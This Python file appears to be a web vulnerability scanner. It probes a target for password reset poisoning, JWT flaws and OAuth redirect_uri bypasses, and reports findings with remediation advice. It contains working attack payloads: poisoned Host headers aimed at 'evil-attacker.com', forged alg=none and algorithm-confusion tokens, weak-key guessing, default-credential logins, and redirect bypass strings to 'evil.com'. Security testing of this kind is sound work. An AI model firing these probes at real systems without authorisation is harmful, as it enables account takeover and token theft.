#!/usr/bin/env python3
"""
Logic-Based Vulnerability Checks
Advanced vulnerability detection through application logic analysis.
"""

import asyncio
import base64
import json
import re
import hashlib
import hmac
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from datetime import datetime

from async_scanner import AsyncHTTPClient, RequestConfig, Response, RateLimitConfig


@dataclass
class LogicFinding:
    """Structured finding from logic-based checks."""
    check_type: str
    title: str
    severity: str  # critical, high, medium, low
    confidence: str  # confirmed, high, medium, low
    target: str
    endpoint: str
    evidence: Dict[str, Any]
    description: str
    remediation: str
    references: List[str] = field(default_factory=list)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    cwe: Optional[str] = None
    cvss: Optional[float] = None

    def to_dict(self) -> Dict:
        return {
            "check_type": self.check_type,
            "title": self.title,
            "severity": self.severity,
            "confidence": self.confidence,
            "target": self.target,
            "endpoint": self.endpoint,
            "evidence": self.evidence,
            "description": self.description,
            "remediation": self.remediation,
            "references": self.references,
            "timestamp": self.timestamp,
            "cwe": self.cwe,
            "cvss": self.cvss,
        }


class PasswordResetPoisoning:
    """
    Detect Password Reset Poisoning via Host Header Injection.

    Tests for:
    - Host header reflection in password reset links
    - X-Forwarded-Host injection
    - Absolute URL generation based on attacker-controlled headers
    """

    RESET_ENDPOINTS = [
        "/password/reset",
        "/password/forgot",
        "/forgot-password",
        "/reset-password",
        "/account/reset",
        "/account/forgot",
        "/auth/reset",
        "/auth/forgot",
        "/users/password/new",
        "/api/password/reset",
        "/api/auth/forgot",
        "/api/v1/password/reset",
        "/api/v1/auth/forgot-password",
    ]

    POISON_HEADERS = [
        ("Host", "evil-attacker.com"),
        ("X-Forwarded-Host", "evil-attacker.com"),
        ("X-Host", "evil-attacker.com"),
        ("X-Forwarded-Server", "evil-attacker.com"),
        ("X-HTTP-Host-Override", "evil-attacker.com"),
        ("Forwarded", "host=evil-attacker.com"),
    ]

    def __init__(self, client: AsyncHTTPClient):
        self.client = client

    async def check(self, target: str) -> List[LogicFinding]:
        """Run password reset poisoning checks on target."""
        findings = []
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # Find password reset endpoint
        reset_endpoint = await self._find_reset_endpoint(base_url)
        if not reset_endpoint:
            return findings

        # Test each poisoning technique
        for header_name, poison_value in self.POISON_HEADERS:
            finding = await self._test_header_injection(
                base_url, reset_endpoint, header_name, poison_value
            )
            if finding:
                findings.append(finding)

        return findings

    async def _find_reset_endpoint(self, base_url: str) -> Optional[str]:
        """Find a password reset endpoint."""
        for endpoint in self.RESET_ENDPOINTS:
            url = f"{base_url}{endpoint}"

            # Try GET first
            resp = await self.client.get(url, timeout=10.0)
            if resp.status in [200, 302, 303, 405]:
                return endpoint

            # Try POST
            resp = await self.client.post(url, timeout=10.0)
            if resp.status in [200, 302, 303, 400, 422]:
                return endpoint

        return None

    async def _test_header_injection(
        self,
        base_url: str,
        endpoint: str,
        header_name: str,
        poison_value: str,
    ) -> Optional[LogicFinding]:
        """Test for header injection in password reset."""
        url = f"{base_url}{endpoint}"

        # Test data
        test_email = "test@example.com"
        test_data = {
            "email": test_email,
            "username": test_email,
        }

        # Send request with poisoned header
        headers = {header_name: poison_value}

        resp = await self.client.post(
            url,
            headers=headers,
            json_data=test_data,
            timeout=15.0,
        )

        # Check for reflection in response
        if poison_value.lower() in resp.body.lower():
            return LogicFinding(
                check_type="password_reset_poisoning",
                title=f"Password Reset Poisoning via {header_name}",
                severity="high",
                confidence="high",
                target=base_url,
                endpoint=endpoint,
                evidence={
                    "header": header_name,
                    "injected_value": poison_value,
                    "reflected_in": "response_body",
                    "status_code": resp.status,
                },
                description=(
                    f"The password reset endpoint reflects the {header_name} header value "
                    "in the response. This could allow an attacker to poison password reset "
                    "links sent to victims, redirecting them to attacker-controlled servers."
                ),
                remediation=(
                    "Generate password reset URLs using a hardcoded, trusted domain. "
                    "Never use Host or X-Forwarded-* headers to construct URLs in emails."
                ),
                references=[
                    "https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning",
                    "https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html",
                ],
                cwe="CWE-74",
                cvss=7.5,
            )

        # Check response headers for reflection
        for header_val in resp.headers.values():
            if poison_value.lower() in header_val.lower():
                return LogicFinding(
                    check_type="password_reset_poisoning",
                    title=f"Host Header Injection via {header_name}",
                    severity="medium",
                    confidence="medium",
                    target=base_url,
                    endpoint=endpoint,
                    evidence={
                        "header": header_name,
                        "injected_value": poison_value,
                        "reflected_in": "response_headers",
                        "status_code": resp.status,
                    },
                    description=(
                        f"The {header_name} header value is reflected in response headers. "
                        "This may indicate potential for password reset poisoning or cache poisoning."
                    ),
                    remediation="Validate and sanitize Host header values. Use allowlists for trusted hosts.",
                    references=[
                        "https://portswigger.net/web-security/host-header",
                    ],
                    cwe="CWE-74",
                    cvss=5.3,
                )

        return None


class JWTVulnerabilityChecker:
    """
    Detect JWT vulnerabilities including:
    - Algorithm confusion (alg=none, HS256/RS256 confusion)
    - Weak signing keys
    - Missing signature validation
    - Token structure issues
    """

    # Common JWT endpoints
    JWT_ENDPOINTS = [
        "/api/login",
        "/api/auth/login",
        "/api/v1/login",
        "/api/token",
        "/api/auth/token",
        "/oauth/token",
        "/auth/jwt",
        "/login",
    ]

    # Weak test keys
    WEAK_KEYS = [
        "secret",
        "password",
        "123456",
        "key",
        "private",
        "jwt_secret",
    ]

    def __init__(self, client: AsyncHTTPClient):
        self.client = client

    async def check(self, target: str, existing_jwt: Optional[str] = None) -> List[LogicFinding]:
        """Run JWT vulnerability checks."""
        findings = []
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # If we have an existing JWT, test it
        if existing_jwt:
            jwt_findings = await self._analyze_jwt(base_url, existing_jwt)
            findings.extend(jwt_findings)
        else:
            # Try to obtain a JWT
            jwt_token = await self._obtain_jwt(base_url)
            if jwt_token:
                jwt_findings = await self._analyze_jwt(base_url, jwt_token)
                findings.extend(jwt_findings)

        return findings

    async def _obtain_jwt(self, base_url: str) -> Optional[str]:
        """Try to obtain a JWT from the target."""
        for endpoint in self.JWT_ENDPOINTS:
            url = f"{base_url}{endpoint}"

            # Try common test credentials
            test_creds = [
                {"username": "admin", "password": "admin"},
                {"email": "test@test.com", "password": "test"},
                {"user": "guest", "pass": "guest"},
            ]

            for creds in test_creds:
                resp = await self.client.post(url, json_data=creds, timeout=10.0)

                # Look for JWT in response
                jwt = self._extract_jwt_from_response(resp)
                if jwt:
                    return jwt

        return None

    def _extract_jwt_from_response(self, resp: Response) -> Optional[str]:
        """Extract JWT from response body or headers."""
        # Check Authorization header
        auth_header = resp.headers.get("authorization", "")
        if auth_header.startswith("Bearer "):
            token = auth_header[7:]
            if self._is_valid_jwt_format(token):
                return token

        # Check body for JWT patterns
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
        matches = re.findall(jwt_pattern, resp.body)
        if matches:
            return matches[0]

        # Check for token in JSON response
        try:
            data = json.loads(resp.body)
            for key in ["token", "access_token", "jwt", "id_token", "accessToken"]:
                if key in data and self._is_valid_jwt_format(str(data[key])):
                    return data[key]
        except (json.JSONDecodeError, TypeError):
            pass

        return None

    def _is_valid_jwt_format(self, token: str) -> bool:
        """Check if string looks like a JWT."""
        parts = token.split('.')
        if len(parts) != 3:
            return False

        try:
            # Try to decode header
            header = self._decode_jwt_part(parts[0])
            return "alg" in header
        except Exception:
            return False

    def _decode_jwt_part(self, part: str) -> Dict:
        """Decode a JWT part (header or payload)."""
        # Add padding if needed
        padding = 4 - len(part) % 4
        if padding != 4:
            part += '=' * padding

        decoded = base64.urlsafe_b64decode(part)
        return json.loads(decoded)

    def _encode_jwt_part(self, data: Dict) -> str:
        """Encode a JWT part."""
        json_bytes = json.dumps(data, separators=(',', ':')).encode()
        return base64.urlsafe_b64encode(json_bytes).rstrip(b'=').decode()

    async def _analyze_jwt(self, base_url: str, token: str) -> List[LogicFinding]:
        """Analyze JWT for vulnerabilities."""
        findings = []

        try:
            parts = token.split('.')
            header = self._decode_jwt_part(parts[0])
            payload = self._decode_jwt_part(parts[1])

            # Check for alg=none vulnerability
            none_finding = await self._test_alg_none(base_url, token, header, payload)
            if none_finding:
                findings.append(none_finding)

            # Check for weak HMAC keys
            weak_key_finding = self._test_weak_keys(token, header)
            if weak_key_finding:
                findings.append(weak_key_finding)

            # Check for algorithm confusion (HS256 vs RS256)
            confusion_finding = await self._test_alg_confusion(base_url, token, header, payload)
            if confusion_finding:
                findings.append(confusion_finding)

            # Check for missing expiration
            if "exp" not in payload:
                findings.append(LogicFinding(
                    check_type="jwt_no_expiration",
                    title="JWT Missing Expiration Claim",
                    severity="medium",
                    confidence="confirmed",
                    target=base_url,
                    endpoint="JWT Token",
                    evidence={
                        "header": header,
                        "payload_keys": list(payload.keys()),
                    },
                    description="The JWT does not contain an expiration (exp) claim, meaning tokens never expire.",
                    remediation="Always include exp claim with reasonable expiration time.",
                    references=["https://datatracker.ietf.org/doc/html/rfc7519#section-4.1.4"],
                    cwe="CWE-613",
                ))

        except Exception as e:
            pass

        return findings

    async def _test_alg_none(
        self,
        base_url: str,
        original_token: str,
        header: Dict,
        payload: Dict,
    ) -> Optional[LogicFinding]:
        """Test for alg=none vulnerability."""
        # Create token with alg=none
        none_header = {**header, "alg": "none"}
        forged_token = (
            self._encode_jwt_part(none_header) + '.' +
            self._encode_jwt_part(payload) + '.'
        )

        # Try to use the forged token
        test_endpoints = ["/api/me", "/api/user", "/api/profile", "/api/v1/user"]

        for endpoint in test_endpoints:
            url = f"{base_url}{endpoint}"
            resp = await self.client.get(
                url,
                headers={"Authorization": f"Bearer {forged_token}"},
                timeout=10.0,
            )

            if resp.status == 200:
                return LogicFinding(
                    check_type="jwt_alg_none",
                    title="JWT Algorithm None Vulnerability",
                    severity="critical",
                    confidence="confirmed",
                    target=base_url,
                    endpoint=endpoint,
                    evidence={
                        "forged_token": forged_token[:50] + "...",
                        "accepted": True,
                        "status_code": resp.status,
                    },
                    description=(
                        "The application accepts JWTs with alg=none, allowing complete "
                        "bypass of signature verification. Attackers can forge any JWT."
                    ),
                    remediation=(
                        "Explicitly validate the algorithm claim against an allowlist. "
                        "Never accept 'none' as a valid algorithm."
                    ),
                    references=[
                        "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
                        "https://portswigger.net/web-security/jwt/algorithm-confusion",
                    ],
                    cwe="CWE-327",
                    cvss=9.8,
                )

        return None

    def _test_weak_keys(self, token: str, header: Dict) -> Optional[LogicFinding]:
        """Test for weak HMAC signing keys."""
        if header.get("alg", "").startswith("HS"):
            parts = token.split('.')
            message = f"{parts[0]}.{parts[1]}".encode()
            signature = parts[2]

            for weak_key in self.WEAK_KEYS:
                # Try to verify with weak key
                expected_sig = base64.urlsafe_b64encode(
                    hmac.new(weak_key.encode(), message, hashlib.sha256).digest()
                ).rstrip(b'=').decode()

                if expected_sig == signature:
                    return LogicFinding(
                        check_type="jwt_weak_secret",
                        title="JWT Signed with Weak Secret",
                        severity="critical",
                        confidence="confirmed",
                        target="JWT Token",
                        endpoint="N/A",
                        evidence={
                            "weak_key": weak_key,
                            "algorithm": header.get("alg"),
                        },
                        description=f"The JWT is signed with a weak, guessable secret: '{weak_key}'",
                        remediation="Use a cryptographically secure random secret of at least 256 bits.",
                        references=["https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html"],
                        cwe="CWE-326",
                        cvss=9.8,
                    )

        return None

    async def _test_alg_confusion(
        self,
        base_url: str,
        original_token: str,
        header: Dict,
        payload: Dict,
    ) -> Optional[LogicFinding]:
        """Test for RS256/HS256 algorithm confusion."""
        # This requires the public key, which we don't have
        # We can only detect potential vulnerability by checking response differences
        if header.get("alg") == "RS256":
            # Try HS256 with an empty key
            hs_header = {**header, "alg": "HS256"}
            message = (
                self._encode_jwt_part(hs_header) + '.' +
                self._encode_jwt_part(payload)
            ).encode()

            # Sign with empty key
            signature = base64.urlsafe_b64encode(
                hmac.new(b'', message, hashlib.sha256).digest()
            ).rstrip(b'=').decode()

            forged_token = message.decode() + '.' + signature

            test_endpoints = ["/api/me", "/api/user", "/api/profile"]
            for endpoint in test_endpoints:
                url = f"{base_url}{endpoint}"
                resp = await self.client.get(
                    url,
                    headers={"Authorization": f"Bearer {forged_token}"},
                    timeout=10.0,
                )

                if resp.status == 200:
                    return LogicFinding(
                        check_type="jwt_alg_confusion",
                        title="JWT Algorithm Confusion (RS256 to HS256)",
                        severity="critical",
                        confidence="high",
                        target=base_url,
                        endpoint=endpoint,
                        evidence={
                            "original_alg": "RS256",
                            "forged_alg": "HS256",
                            "status_code": resp.status,
                        },
                        description=(
                            "The application may be vulnerable to JWT algorithm confusion. "
                            "An RS256 token was accepted when re-signed as HS256."
                        ),
                        remediation=(
                            "Explicitly specify expected algorithm when verifying JWTs. "
                            "Never allow algorithm to be determined by the token itself."
                        ),
                        references=[
                            "https://portswigger.net/web-security/jwt/algorithm-confusion",
                        ],
                        cwe="CWE-327",
                        cvss=9.8,
                    )

        return None


class OAuthRedirectChecker:
    """
    Detect OAuth redirect_uri vulnerabilities:
    - Open redirect via redirect_uri manipulation
    - Wildcard subdomain abuse
    - Path traversal in redirect_uri
    - Token leakage via referrer
    """

    OAUTH_ENDPOINTS = [
        "/oauth/authorize",
        "/oauth2/authorize",
        "/auth/authorize",
        "/authorize",
        "/api/oauth/authorize",
        "/connect/authorize",
        "/oauth/auth",
    ]

    # Bypass techniques for redirect_uri
    REDIRECT_BYPASSES = [
        # Open redirect via subdomain
        ("https://evil.com", "direct_external"),
        # Subdomain matching bypass
        ("https://legitimate.com.evil.com", "subdomain_suffix"),
        # Path bypass
        ("https://legitimate.com@evil.com", "userinfo_injection"),
        # Fragment bypass
        ("https://legitimate.com#@evil.com", "fragment_injection"),
        # Parameter pollution
        ("https://legitimate.com?next=https://evil.com", "param_pollution"),
        # Backslash bypass
        ("https://legitimate.com\\@evil.com", "backslash_bypass"),
        # Null byte
        ("https://legitimate.com%00.evil.com", "null_byte"),
        # Unicode bypass
        ("https://legitimate.com%E3%80%82evil.com", "unicode_dot"),
    ]

    def __init__(self, client: AsyncHTTPClient):
        self.client = client

    async def check(self, target: str) -> List[LogicFinding]:
        """Run OAuth redirect_uri checks."""
        findings = []
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        legitimate_domain = parsed.netloc

        # Find OAuth endpoint
        oauth_endpoint = await self._find_oauth_endpoint(base_url)
        if not oauth_endpoint:
            return findings

        # Test redirect_uri bypasses
        for bypass_uri, bypass_type in self.REDIRECT_BYPASSES:
            # Replace legitimate.com with actual domain in bypass
            test_uri = bypass_uri.replace("legitimate.com", legitimate_domain)

            finding = await self._test_redirect_bypass(
                base_url, oauth_endpoint, test_uri, bypass_type
            )
            if finding:
                findings.append(finding)

        # Test for wildcard subdomain acceptance
        wildcard_finding = await self._test_wildcard_subdomain(
            base_url, oauth_endpoint, legitimate_domain
        )
        if wildcard_finding:
            findings.append(wildcard_finding)

        return findings

    async def _find_oauth_endpoint(self, base_url: str) -> Optional[str]:
        """Find OAuth authorization endpoint."""
        for endpoint in self.OAUTH_ENDPOINTS:
            url = f"{base_url}{endpoint}"
            resp = await self.client.get(url, timeout=10.0, follow_redirects=False)

            # OAuth endpoints typically return 400 without params or redirect
            if resp.status in [200, 302, 400, 401]:
                return endpoint

        return None

    async def _test_redirect_bypass(
        self,
        base_url: str,
        endpoint: str,
        malicious_uri: str,
        bypass_type: str,
    ) -> Optional[LogicFinding]:
        """Test a redirect_uri bypass technique."""
        url = f"{base_url}{endpoint}"
        params = {
            "client_id": "test_client",
            "redirect_uri": malicious_uri,
            "response_type": "code",
            "scope": "openid",
        }

        full_url = f"{url}?{urlencode(params)}"
        resp = await self.client.get(full_url, timeout=10.0, follow_redirects=False)

        # Check if the malicious URI was accepted
        location = resp.headers.get("location", "")

        # If redirected to our malicious URI or no error about redirect_uri
        if "evil.com" in location or (resp.status == 302 and "error" not in location.lower()):
            return LogicFinding(
                check_type="oauth_redirect_bypass",
                title=f"OAuth redirect_uri Bypass ({bypass_type})",
                severity="high",
                confidence="high",
                target=base_url,
                endpoint=endpoint,
                evidence={
                    "bypass_type": bypass_type,
                    "malicious_uri": malicious_uri,
                    "status_code": resp.status,
                    "redirect_location": location[:200] if location else None,
                },
                description=(
                    f"The OAuth authorization endpoint accepts a manipulated redirect_uri "
                    f"using the {bypass_type} technique. This could allow authorization "
                    "code or token theft."
                ),
                remediation=(
                    "Implement strict redirect_uri validation using exact string matching. "
                    "Maintain a whitelist of pre-registered redirect URIs."
                ),
                references=[
                    "https://portswigger.net/web-security/oauth",
                    "https://datatracker.ietf.org/doc/html/rfc6819#section-4.2.4",
                ],
                cwe="CWE-601",
                cvss=7.4,
            )

        # Check if there's an error indicating partial validation
        if resp.status == 400 and "redirect" in resp.body.lower():
            # Validation exists but let's check if it's robust
            return None

        return None

    async def _test_wildcard_subdomain(
        self,
        base_url: str,
        endpoint: str,
        legitimate_domain: str,
    ) -> Optional[LogicFinding]:
        """Test for wildcard subdomain acceptance."""
        # Test with random subdomain
        wildcard_uri = f"https://evil-subdomain.{legitimate_domain}/callback"

        url = f"{base_url}{endpoint}"
        params = {
            "client_id": "test_client",
            "redirect_uri": wildcard_uri,
            "response_type": "code",
        }

        full_url = f"{url}?{urlencode(params)}"
        resp = await self.client.get(full_url, timeout=10.0, follow_redirects=False)

        location = resp.headers.get("location", "")

        if resp.status == 302 and "evil-subdomain" in location:
            return LogicFinding(
                check_type="oauth_wildcard_subdomain",
                title="OAuth Accepts Wildcard Subdomains in redirect_uri",
                severity="medium",
                confidence="high",
                target=base_url,
                endpoint=endpoint,
                evidence={
                    "test_uri": wildcard_uri,
                    "accepted": True,
                    "redirect_location": location[:200],
                },
                description=(
                    "The OAuth endpoint accepts any subdomain in the redirect_uri. "
                    "If an attacker can create/control a subdomain, they can steal tokens."
                ),
                remediation="Use exact redirect_uri matching rather than wildcard subdomain patterns.",
                references=[
                    "https://datatracker.ietf.org/doc/html/rfc6819#section-4.1.5",
                ],
                cwe="CWE-601",
                cvss=5.4,
            )

        return None


class LogicVulnerabilityScanner:
    """
    Orchestrates all logic-based vulnerability checks.
    """

    def __init__(
        self,
        rate_limit: float = 10.0,
        timeout: float = 15.0,
        proxy: Optional[str] = None,
    ):
        rate_config = RateLimitConfig(
            requests_per_second=rate_limit,
            per_host_limit=5.0,
        )
        self.client = AsyncHTTPClient(rate_config=rate_config, proxy=proxy)

        self.checkers = {
            "password_reset_poisoning": PasswordResetPoisoning(self.client),
            "jwt_vulnerabilities": JWTVulnerabilityChecker(self.client),
            "oauth_redirect": OAuthRedirectChecker(self.client),
        }

    async def scan(
        self,
        target: str,
        checks: Optional[List[str]] = None,
        jwt_token: Optional[str] = None,
    ) -> List[LogicFinding]:
        """
        Run logic-based vulnerability checks on target.

        Args:
            target: Target URL
            checks: List of specific checks to run (None for all)
            jwt_token: Optional existing JWT token to analyze

        Returns:
            List of LogicFinding objects
        """
        findings = []
        checks_to_run = checks or list(self.checkers.keys())

        for check_name in checks_to_run:
            if check_name not in self.checkers:
                continue

            checker = self.checkers[check_name]

            try:
                if check_name == "jwt_vulnerabilities" and jwt_token:
                    check_findings = await checker.check(target, existing_jwt=jwt_token)
                else:
                    check_findings = await checker.check(target)

                findings.extend(check_findings)
            except Exception as e:
                # Log error but continue with other checks
                pass

        return findings

    async def scan_multiple(
        self,
        targets: List[str],
        checks: Optional[List[str]] = None,
        concurrency: int = 5,
    ) -> Dict[str, List[LogicFinding]]:
        """
        Scan multiple targets concurrently.

        Args:
            targets: List of target URLs
            checks: Specific checks to run
            concurrency: Max concurrent target scans

        Returns:
            Dict mapping target URL to findings list
        """
        semaphore = asyncio.Semaphore(concurrency)
        results = {}

        async def scan_target(target: str) -> Tuple[str, List[LogicFinding]]:
            async with semaphore:
                findings = await self.scan(target, checks)
                return target, findings

        tasks = [scan_target(t) for t in targets]
        completed = await asyncio.gather(*tasks, return_exceptions=True)

        for result in completed:
            if isinstance(result, tuple):
                target, findings = result
                results[target] = findings
            else:
                # Exception occurred
                pass

        return results

    async def close(self):
        """Clean up resources."""
        await self.client.close()


if __name__ == "__main__":
    import sys

    async def main():
        target = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"

        print(f"[*] Running logic-based checks on {target}")
        print("=" * 60)

        scanner = LogicVulnerabilityScanner(rate_limit=5.0)

        try:
            findings = await scanner.scan(target)

            if findings:
                print(f"\n[+] Found {len(findings)} issues:\n")
                for finding in findings:
                    print(f"  [{finding.severity.upper()}] {finding.title}")
                    print(f"      Type: {finding.check_type}")
                    print(f"      Endpoint: {finding.endpoint}")
                    print(f"      Confidence: {finding.confidence}")
                    print()
            else:
                print("\n[-] No vulnerabilities found")

        finally:
            await scanner.close()

    asyncio.run(main())
